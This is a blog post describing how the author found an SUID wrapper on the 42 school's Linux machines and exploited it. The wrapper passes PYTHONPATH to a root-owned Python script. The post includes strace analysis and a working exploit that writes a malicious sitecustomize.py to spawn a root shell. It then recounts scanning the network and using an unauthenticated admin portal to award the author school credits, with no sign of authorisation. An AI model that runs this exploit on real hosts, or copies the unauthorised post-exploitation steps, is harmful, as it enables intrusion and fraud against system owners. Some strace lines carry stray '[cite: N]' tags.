---
layout: post
title:  "Founding 0day in 42 Schools"
categories: [cyber-security]
tags: [pentest]
image: images/42lpe_achievements.png
---

## Introduction

Recently found a 0day vulnerability in 42 schools network and performed local privilege escalation.
Then discoverd an unauthorized admin portal and become the richest man in the 42schools. So I will
talk about: how it all started, anlaysis on the 0day, and the post exploitation phase.

### Motivation

In our campus we have a towel, you know that famous towel from the actual book. It can only be
acquired by 42.000 credits. For the read who is not familiar with the 42 schools, we have our own
shop and money system, that we can buy merchandises or extra ram to our cubicles. Towel is very
expensive, so technically it's impossible to buy, technically... You can see why it's a perfect
thropy for a security enthusiast.

![Shop](images/42lpe_shop.png){: w="480"}

## 0day

Everything started with, my fellow friend sent me a screenshot of a folder, that whatever you put in
it, it instantly downloaded to all other computers. To be honst, this piece of information not that
related with the 0day, but this was the initial spark for us to dig more.

Our school prefers linux for their student computers. So started with classic practice of local
privilege escalation enumeration. During discovery `/usr/bin/pkgtool` binary with SUID bit was
standing out. For who is familiar with standard linux binaries, it's easy to identify that this is
not a standard binary for the system. The combination of an SUID bit on a custom binary is always a
massive red flag—you don't need spider-sense to feel a little excited when you spot one. 

You may ask what's so special about SUID bits, simply if a binary has a SUID bit, a specified user
can run this binary behalf of an another specified user.

In our case the `pkgtool` binary was configured for student users to run that binary behalf of the
root user. Discovered that the binary was a C wrapper for the actual python script
located at `/opt/pkgtool/pkgtool`.  Here are the stats ouput of the two files.

```bash
  File: /usr/bin/pkgtool
  Size: 16088     	Blocks: 32         IO Block: 4096   regular file
Device: 10303h/66307d	Inode: 5113213     Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2026-03-07 21:41:02.172450033 +0300
Modify: 2025-03-20 09:34:57.830461347 +0300
Change: 2025-03-20 09:34:57.831461383 +0300
 Birth: 2025-03-20 09:34:57.819460954 +0300

  File: /opt/pkgtool/pkgtool
  Size: 7724      	Blocks: 16         IO Block: 4096   regular file
Device: 10303h/66307d	Inode: 12591093    Links: 1
Access: (0711/-rwx--x--x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2026-03-07 21:41:02.174450103 +0300
Modify: 2025-03-20 09:34:57.006431930 +0300
Change: 2025-03-20 09:34:57.735457955 +0300
 Birth: 2025-03-03 17:38:32.290798430 +0300
```

### Analyzing `strace` Output

In order to perform local privilege escalation, analysing the `strace` output of the binary was
sufficiant, so I will only focus on that part.

**1. Capturing the Initial State**

The very first line of the trace output is often overlooked, but here, it held the key to the entire
exploit.

```bash
execve("/usr/bin/pkgtool", ["/usr/bin/pkgtool", "install", "fake_pack"], 0x7ffc3239fcf0 /* 58 vars */) = 0 
```

This is the initial execution of our binary. The most important detail is the `/* 58 vars */` comment
appended by strace. This confirms that when the SUID wrapper launched, it inherited 58 environment
variables directly from my unprivileged user profile. Keep that number in mind.

**2. Discovering the Wrapper**

Right after the initial memory mapping and library loading, the trace revealed a second, distinct
execve call. That proved `/usr/bin/pkgtool` is not the actual application, but a wrapper.

```bash
execve("/opt/pkgtool/pkgtool", ["/opt/pkgtool/pkgtool", "install", "fake_pack"], 0x7ffff32adb98 /* 58 vars */) = 0 [cite: 499, 500]
```

This output told us three crucial things:

- The Real Target: The wrapper's sole purpose is to execute a hidden file located at
  `/opt/pkgtool/pkgtool` I believe the intention was providing SUID bit to the python script.
- Argument Pass-Through: The arguments we provided (install, fake\_pack) were passed directly to the
  inner script without modification.
- The Vulnerability (Environment Inheritance): Notice the `/* 58 vars */` again? The C wrapper took
  the exact same 58 environment variables belonging to my unprivileged user and passed them entirely
unsanitized to the new process.

Immediately after the second execve call, the process began searching the file system for specific libraries.

**3. Identifying the Technology**

Immediately after the second execve call, the process began searching the file system for specific
libraries.

```bash
readlink("/usr/bin/python3", "python3.10", 4096) = 10 [cite: 508]
newfstatat(AT_FDCWD, "/usr/lib/python3.10/os.py", {st_mode=S_IFREG|0644, st_size=39557, ...}, 0) = 0 [cite: 508, 509]
```

The readlink call clearly shows that the hidden file (/opt/pkgtool/pkgtool) is actually a Python
3.10 script. Because we already established that the wrapper passes our environment variables down
to this process, we now knew we were dealing with a Python environment injection vulnerability.

**4. Discovering the Exploit**

As Python booted up, the trace showed the interpreter aggressively searching for configuration files
and standard modules in its default paths.

```bash
newfstatat(AT_FDCWD, "/usr/lib/python3.10/sitecustomize.py", {st_mode=S_IFREG|0644, st_size=155, ...}, 0) = 0 [cite: 572]
openat(AT_FDCWD, "/usr/lib/python3.10/__pycache__/sitecustomize.cpython-310.pyc", O_RDONLY|O_CLOEXEC) = 3 [cite: 572]
```

During standard initialization, Python natively looks for the sitecustomize module. Because we
control the environment (specifically the PYTHONPATH variable), I realized we could force Python to
load a malicious `sitecustomize.py` file from a directory we control (like /tmp) before it ever
reaches the system's default /usr/lib/python3.10/ directory.

**5. The SUID Privilege Drop (Why the Trace Crashed)**

At the very end of the trace, the process suddenly failed with a permissions error.

```bash
newfstatat(AT_FDCWD, "/opt/pkgtool/pkgtool", {st_mode=S_IFREG|0711, st_size=7724, ...}, 0) = 0 [cite: 577]
openat(AT_FDCWD, "/opt/pkgtool/pkgtool", O_RDONLY|O_CLOEXEC) = -1 EACCES (Permission denied) [cite: 577, 578]
write(2, "/usr/bin/python3: can't open fil"..., 87/usr/bin/python3: can't open file '/opt/pkgtool/pkgtool': [Errno 13] Permission denied
) = 87 [cite: 578]
```

The inner Python script has 0711 permissions (-rwx--x--x), meaning only the root user is allowed to
read its contents. Normally, the SUID wrapper temporarily elevates our user to root, allowing Python
to read and execute the script.

However, `strace` has a built-in security feature: it automatically disables SUID execution to prevent
unprivileged users from attaching debuggers to root processes. Because strace dropped the privileges
back to my standard user, Python was denied access to read the script, causing the crash.

### Performing The Local Privilege Escalation

With the strace analysis demystifying the binary's behavior, performing the actual attack is a
remarkably straightforward process. The hard work was in the enumeration and system-call analysis;
the exploitation phase just requires putting those pieces together.

```bash
cat << 'EOF' > /tmp/sitecustomize.py
import os
os.setresuid(0, 0, 0)
os.setresgid(0, 0, 0)
os.system("/bin/sh -p")
EOF

PYTHONPATH=/tmp /usr/bin/pkgtool
rm /tmp/sitecustomize.py
```

Since this is a very classic implementation I won't going into details of this, but simply we are
doing two different operations here:

1. Creating `sitecustomize.py` script that will give root shell when executed with privileged user
2. And setting up the environment variable for `PYTHONPATH`.

Because the C wrapper blindly passed our environment variables to the inner script, the payload
executed with the wrapper's inherited root permissions. Running this script resulted in an immediate
drop into an interactive root shell.

## We are root... now what? Don't Panic!

I know that was prety straightworfard but it is always an amazing feeling to see `#` on your
terminal. To buy towel, we need to find a way to give us 42.000 credits. At this point we could
search for credential reuse, kerberoasting for accessing stuff accounts, letheral movement to more
privileged devices. However main challange was performing those in a innocent way, without peeking
into sensitive informations and stuff accounts. Using root privileges downloaded several security
tools.

![Stuff Portal](images/42lpe_stuffportal_redacted.png){: w="480"}

So our plan was finding a service, that potentially exist to manage students quickly. And during the
nmap scans and we found the jackpot! An admin portal without authorization mechanism, just hanging
there. And this is the story of how we become the richest mans in 42 schools.

![Richman Achivement](images/42lpe_richman.png){: w="480"}

## Ending

At some points attacks were streightforward and easy. But I don't particularly think that stuff
members are bad at their job. In fact, I often see that most impactful vulnerabilities caused by
very simple mistakes, especially on big enterprise networks. Humans tend to make mistakes, and
forgot services that used before and outdated in the present day. To prevent such mistakes,
automated vulnerability scannings seems like a good solution especially with the upcoming AI
technologies. Not for the fix every vulnerability, but just pinpointing forgotten human mistakes.

## About the Towel

We haven't received our thropies yet, but in a month I will update this writing again, and hopefuly
put an image here. Thanks for reading until here, and hoping that shared the similar excitement that
I experienced during the whole process.
